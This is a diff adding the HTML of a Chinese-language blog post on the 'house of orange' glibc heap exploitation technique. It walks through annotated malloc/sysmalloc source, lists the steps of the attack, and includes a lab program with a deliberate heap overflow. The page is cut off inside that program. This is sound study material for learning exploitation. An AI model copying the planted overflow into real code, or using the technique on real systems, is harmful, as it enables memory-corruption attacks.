@@ -1,0 +1,797 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="N1mbus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="介绍了house of orange的利用手法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="house of orange">
+<meta property="og:url" content="http://example.com/post/house-of-orange-2s1kns.html">
+<meta property="og:site_name" content="N1mbus">
+<meta property="og:description" content="介绍了house of orange的利用手法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250618220257-5ktx3z9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250618212121-4ewwsp2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250618212204-90ryqs5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250618212243-1gts4un.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250618212446-gvkih5a.png">
+<meta property="article:published_time" content="2025-06-19T11:18:51.000Z">
+<meta property="article:modified_time" content="2025-06-19T11:18:54.000Z">
+<meta property="article:author" content="N1mbus">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="house of XX">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250618220257-5ktx3z9.png">
+  
+  
+  
+  <title>house of orange - N1mbus</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"HGQ2AAsXTVipJuHOCxNQPl8A-gzGzoHsz","app_key":"xkvgsYTbMeB59u2gc4HqxaBN","server_url":"https://hgq2aasx.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>N1mbus的摆烂日记</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">house of orange</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-19 11:18" pubdate>
+          2025年6月19日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">house of orange</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h1><p>高估自己了，这周好忙，感觉要完不成自己写的计划了，不管了，先写吧，能写完多少是多少。(后面写着写着不知道怎么陷进去了，可能很抽象，可以直接看图）</p>
+<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>house of orange主要利用在题目中不存在free函数或则其他可以释放堆块的操作时，可以使用这种手法获得一个unsorted bins。</p>
+<h2 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h2><p>说实话，网上的一些文章虽然会给出源码，但是不知道各个变量的定义，感觉还是不太理解意思，这深刻的说明了，源码还是得通读一遍。</p>
+<p>我们都知道，当现有的堆块不满足我们的申请的时候，会向top chunk中申请出我们所需要的chunk，但是，如果此时连top chunk也不能满足我们的申请需求了呢？这时候堆管理器就会采用两种方法去解决这种情况：1，将top chunk扩大；2.使用mmap开辟出一个空间作为堆空间</p>
+<p>现在，我们就需要仔细来了解一下堆管理器对top chunk不足以满足申请条件时的解决方案，以达到我们想要的情况</p>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3828">完整源码</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><span class="hljs-comment">/* 规范化的请求大小 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><span class="hljs-comment">/* 关联的箱索引 */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><span class="hljs-comment">/* 关联的存储桶 */</span><br><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><span class="hljs-comment">/* 已检查/已选择的代码块 */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><span class="hljs-comment">/* 它的尺寸 */</span><br>  <span class="hljs-type">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><span class="hljs-comment">/* 它的bin索引 */</span><br><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><span class="hljs-comment">/* 从分割中获得的余数 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><span class="hljs-comment">/* 它的大小 */</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><span class="hljs-comment">/* 位图遍历器 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><span class="hljs-comment">/* 位图遍历器 */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><span class="hljs-comment">/* binmap的当前词 */</span><br><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><span class="hljs-comment">/* 链接的各种临时文件 */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><span class="hljs-comment">/* 链接的各种临时文件 */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure>
+
+<p>这些是一些变量</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br>  victim = av-&gt;top;         <span class="hljs-comment">// 拿到当前 arena 的 top chunk</span><br>  size = chunksize(victim); <span class="hljs-comment">// top chunk 的实际大小</span><br><br>  <span class="hljs-keyword">if</span> (size &gt;= nb + MINSIZE) &#123;<br>    <span class="hljs-comment">// 1️⃣ 如果 top chunk 足够大：直接从里面切</span><br>    remainder_size = size - nb;                    <span class="hljs-comment">// 剩下的部分</span><br>    remainder = chunk_at_offset(victim, nb);       <span class="hljs-comment">// 剩下部分的新 chunk</span><br>    av-&gt;top = remainder;                           <span class="hljs-comment">// 更新 arena 的 top chunk</span><br>    set_head(victim, nb | PREV_INUSE | ...);       <span class="hljs-comment">// 设置分配出去的 chunk 的头部信息</span><br>    set_head(remainder, remainder_size | PREV_INUSE); <span class="hljs-comment">// 设置新 top chunk 的头</span><br><br>    check_malloced_chunk(av, victim, nb);          <span class="hljs-comment">// 检查分配出去的 chunk 是否合法</span><br>    <span class="hljs-type">void</span> *p = chunk2mem(victim);                   <span class="hljs-comment">// 去掉头部信息，返回 user pointer</span><br>    alloc_perturb(p, bytes);                       <span class="hljs-comment">// （可选）污染新分配的内存，调试用</span><br>    <span class="hljs-keyword">return</span> p;                                      <span class="hljs-comment">// 🎉 完成分配</span><br>  &#125;<br><br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks(av)) &#123;<br>    <span class="hljs-comment">// 2️⃣ top chunk 不够 &amp; bins 里有 fastchunk</span><br>    <span class="hljs-comment">//    先把 fastbin 里的小块合并回来</span><br>    malloc_consolidate(av);  <span class="hljs-comment">// 合并 fast bin</span><br>    idx = (nb 属于 smallbin ? smallbin_index(nb) : largebin_index(nb));<br>  &#125;<br><br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 3️⃣ top chunk 不够 &amp; bins 没有可用块</span><br>    <span class="hljs-comment">//    调用 sysmalloc: 向操作系统申请更多内存</span><br>    <span class="hljs-type">void</span> *p = sysmalloc(nb, av);<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>      alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p>出现这个函数的时机是当我们申请一个chunk，在已经检查完堆空间中存在的bins没有可以满足分配条件，对top chunk进行检查</p>
+<p>由源码可以看到，如果需要利用house of orange,我们应该进入到else分支，即top chunk不足以分配且堆中没有大量连续的fast bins</p>
+<p>当进入else的分支之后，我们调用了sysmalloc函数</p>
+<p>看了一下源码，sysmalloc大致分为三个部分进行操作</p>
+<p>首先，进行判断是不是可以使用mmap进行扩容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>      || ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.mmap_threshold)<br>	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))<br></code></pre></td></tr></table></figure>
+
+<p>av表示当前使用的arena，av&#x3D;null则表示当前还没有arena，但是一般我们打堆都已经有了main_arena，所以这个条件一般不会满足；nb表示的是我们当前准备申请的堆块大小，如果它大于mmap阈值（mp_.mmap_threshold）（一般为128kb）并且已分配的mmap没有达到上限（mp_.n_mmaps_max），就采用mmap进行扩容。</p>
+<p>所以要绕过这个检测也很简单，只需要保证我们申请的堆块大小不要超过mmap的阈值就可以了</p>
+<p>之后，当不使用mmap扩容时，先判断是否arena是否是main_arena，按理来说，了解house of orange我们应该只关注main_arena，关于子arena的部分我们可以跳过，但是我看了源码之后，我觉得在子arena里面如果没有free好像也能获得一个unsorted bins</p>
+<hr>
+<p>关于子arena：子arena不能使用srbk进行扩容，就会采用grow_heap函数进行扩容，即mmap一块区域刚好位于子arena后，这样看起来就像top chunk增大了的效果一样，但是子arena的后面不一定能刚好能mmap，所以当grow_heap失效的时候，就会直接mmap。现在，在这两种情况下，top chunk的情况呢？当使用grow_heap时，top chunk会更新为top chunk+mmap更新的长度，在这种情况下不会出现bins；2.当使用new_heap重新mmap一块新的区域作为top chunk时，旧的top chunk就会被处理，会在后面截出一段作为fencepost用以告诉后面的chunk不要跨段合并，如果被截短后的剩下的top chunk仍然大于MINSIZE，此时，我们就可以获得bins</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>&#123;<br>  <span class="hljs-comment">// 插 double fencepost</span><br>  set_head (chunk_at_offset (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>  set_foot (chunk_at_offset (old_top, old_size), (<span class="hljs-number">2</span> * SIZE_SZ));<br><br>  <span class="hljs-comment">// 更新老 top chunk 的头</span><br>  set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);<br><br>  <span class="hljs-comment">// 丢回 bin</span><br>  _int_free (av, old_top, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以我认为，在子arena里面，不使用free也能够得到unsorted bin，等会在实验中将实验一下，看是不是真的能够出现一个unsorted bin</p>
+<hr>
+<p>好了，刚刚的猜想结束了，我们应该继续推进我们的源码了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">  size = nb + mp_.top_pad + MINSIZE;<br><span class="hljs-comment">// 向上对齐到页大小（sbrk 必须按页走）</span><br>  size = ALIGN_UP (size, pagesize);<br><br>  <span class="hljs-comment">// 如果 size 有效，则真正调用 sbrk 扩容</span><br>  <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span>)<br>  &#123;<br>    brk = (<span class="hljs-type">char</span> *) (MORECORE (size)); <span class="hljs-comment">// 一般就是 sbrk(size)</span><br>    LIBC_PROBE (memory_sbrk_more, <span class="hljs-number">2</span>, brk, size); <span class="hljs-comment">// 内部 tracing，不影响逻辑</span><br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里的size是我们要申请的大小加上MINSIZE加上mp_.top_pad（冗余大小）必须要是页对齐的，应为sbrk只能以页为单位申请</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (snd_brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>      &#123;<br>        av-&gt;top = (mchunkptr) aligned_brk;<br>        set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);<br>        av-&gt;system_mem += correction;<br><br>        <span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>)<br>        &#123;<br>          old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;<br>          set_head (old_top, old_size | PREV_INUSE);<br><br>          chunk_at_offset (old_top, old_size)-&gt;size =<br>            (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE;<br><br>          chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ)-&gt;size =<br>            (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE;<br><br>          <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>          &#123;<br>            _int_free (av, old_top, <span class="hljs-number">1</span>); <br>          &#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到，最后我们会进入到free将剩下的top chunkfree掉（感觉太抽象了，我打算画一下图解释一下）</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250618220257-5ktx3z9.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>（自己画的，有点丑）</p>
+<p>第一幅图就是还没有扩容得时候的堆空间的结构</p>
+<p>第二幅图是当我们申请malloc(top_chunk+0x20)超过此时top chunk大小的空间，且此时没有其他的bins可用于分配或则合并得到申请的大小，就会使用sbrk进行扩容，增加的大小为top_chunk+0x20+MINSIZE+mp_.top_pad然后进行页对齐</p>
+<p>（例如：top_chunk+0x20+MINSIZE+mp_.top_pad&#x3D;0.5page&#x3D;2kb，扩容的大小就是1page&#x3D;4kb； top_chunk+0x20+MINSIZE+mp_.top_pad&#x3D;2.5page&#x3D;10kb，扩容的大小就是3page&#x3D;12kb；）</p>
+<p>第三幅图就是结束后的样子，在成功扩容后，会生成两个fencepost chunk用于阻拦之前的堆空间和扩容出来的堆空间合并（可能是为了阻拦形成过大的空间？还不太了解为什么会这样），如果剩下的old_top_chunk仍然还大于MINSIZE，就会被free掉，达成我们的目的</p>
+<p>‍</p>
+<p>所以，其实house of orange的手法很简单</p>
+<p>1.通过溢出修改top chunk的大小（使fake top chunk size加上之前的空间为页对齐）</p>
+<p>（其实我在源码里面貌似没有看见检查top end地址要是页对齐的，但是分配机制是以页为单位，所以怀疑是因为这个原因才需要页对齐）</p>
+<p>2.top chunk的size 的 prev inuse 位应该为 1</p>
+<p>3.申请一个大于现在的top chunk但是又小于mp_.mmap_threshold）（一般为128kb）</p>
+<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>其实我是看不太懂源码的，所以也不太能保证前面的原理解释对不对，所以得试验一下看看堆的结构</p>
+<p>实验目的：</p>
+<p>1.使用house of orange得到一个unsorted bins</p>
+<p>2.想看看如果没有实现页对齐会发生什么</p>
+<p>触发条件，存在堆溢出，可以覆盖掉top chunk的size位，然后为了防止tcache bin开始生成的堆影响直观性，采用glibc2.23版本（一下为实验代码）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 8</span><br><br><span class="hljs-type">char</span> *chunks[MAX];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to Heap Playground!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-keyword">for</span> (idx = <span class="hljs-number">0</span>; idx &lt; MAX; idx++) &#123;<br>        <span class="hljs-keyword">if</span> (!chunks[idx]) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (idx == MAX) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Too many chunks!&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%u&quot;</span>, &amp;size);<br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0x1000</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Too big!&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    chunks[idx] = <span class="hljs-built_in">malloc</span>(size);<br>    <span class="hljs-keyword">if</span> (!chunks[idx]) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Malloc failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Chunk[%d] @ %p\n&quot;</span>, idx, chunks[idx]);<span class="hljs-comment">//给出每个chunk的地址</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content: &quot;</span>);<br>    read(<span class="hljs-number">0</span>, chunks[idx], size + <span class="hljs-number">8</span>);  <br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Chunk %d allocated.\n&quot;</span>, idx);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Add&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. Exit&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        menu();<br>        <span class="hljs-type">int</span> choice;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;choice);<br>        <span class="hljs-keyword">switch</span> (choice) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: add(); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>: <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid.&quot;</span>); <span 